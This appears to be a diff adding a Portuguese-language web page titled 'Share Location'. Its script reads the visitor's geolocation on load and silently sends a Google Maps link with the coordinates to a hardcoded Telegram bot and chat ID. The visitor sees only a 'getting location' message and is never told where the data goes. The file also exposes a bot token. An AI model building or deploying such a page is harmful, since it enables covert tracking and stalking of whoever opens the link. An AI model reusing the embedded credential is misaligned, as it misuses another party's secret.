@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Compartilhar Localização</title>
+</head>
+<body>
+  <h3>Obtendo localização...</h3>
+
+  <script>
+    // Substitua com seu token e chat_id
+    const botToken = '8141924853:AAHS966DzZDHo0nJfxAkjFn8L6J0PnN-eok';
+    const chatId = '7592879085';
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const message = `📍 Localização automática:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+        // Enviar para o Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+      }, function(error) {
+        document.body.innerHTML = "<h3>Erro ao obter localização.</h3>";
+      });
+    } else {
+      document.body.innerHTML = "<h3>Geolocalização não suportada neste navegador.</h3>";
+    }
+  </script>
+</body>
+</html>
